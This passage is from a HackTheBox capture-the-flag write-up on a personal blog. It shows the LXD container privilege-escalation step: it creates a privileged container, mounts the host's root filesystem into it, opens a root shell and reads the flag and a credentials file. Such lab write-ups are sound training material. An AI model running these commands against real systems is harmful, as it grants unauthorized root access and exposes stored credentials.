</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">mike@included:/tmp$ lxc  init &lt;aliasName&gt;  ignite -c   security.privileged<span class="o">=</span><span class="nb">true</span>
mike@included:/tmp$ lxc  init  rootimage   ignite -c   security.privileged<span class="o">=</span><span class="nb">true</span>
mike@included:/tmp$ lxc  config  device  add  ignite  mydevice  disk <span class="nv">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true</span>
</code></pre></td></tr></table>
</div>
</div><p>The next set of commands start the container and drop us into a shell
(as root) on it.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">mike@included:/tmp$ lxc  start  ignite
mike@included:/tmp$ lxc  <span class="nb">exec</span>  ignite  /bin/sh
</code></pre></td></tr></table>
</div>
</div><p>We can now navigate to /mnt/root/root/ and read root.txt along with
login.sql, which reveals credentials.</p>
<div style="width:100%; background-color:#252b34;text-align: left;border: 1px solid black;" ><img width="70%"  src="media/image190.png"></div>
<p>The <strong>login.sql</strong> file reveals some credentials</p>
<div style="width:100%; background-color:#252b34;text-align: left;border: 1px solid black;" ><img width="70%"  src="media/image191.png"></div>
<br>
<div style="width:100%; background-color:#252b34;text-align: left;border: 1px solid black;" ><img width="70%"  src="media/image192.png"></div>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 20-06-2022</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            
     
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/hacking/">Hacking</a>,&nbsp;<a href="/tags/hackthebox/">HackTheBox</a>,&nbsp;<a href="/tags/penetration-testing/">Penetration Testing</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="//">Home</a></span>
        </section>
    </div>

    <div class="post-nav">
            <a href="/practicalbinaryanalysis_intro/" class="next" rel="next" title="[Practical Binary Analysis] Introduction">[Practical Binary Analysis] Introduction<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>


        <div style="height: 80px;position:absolute;">&nbsp;</div>
    </article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.92.2">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":20,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
